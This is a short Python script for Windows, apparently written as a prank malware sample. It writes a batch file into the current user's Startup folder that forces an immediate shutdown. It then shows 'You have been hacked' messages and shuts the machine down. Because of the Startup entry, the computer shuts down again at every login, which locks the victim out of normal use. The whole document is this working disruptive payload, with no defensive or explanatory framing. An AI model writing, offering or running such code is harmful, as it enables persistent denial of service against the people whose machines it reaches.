import os
user=os.getlogin()
file=open('C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/log.bat',"x")
file.write("shutdown.exe -s -t 0s")
file.close()
os.system("msg %username% You have been hacked :)")
os.system("msg %username% Goodbye!!")
os.system("shutdown.exe -s -t 0s")

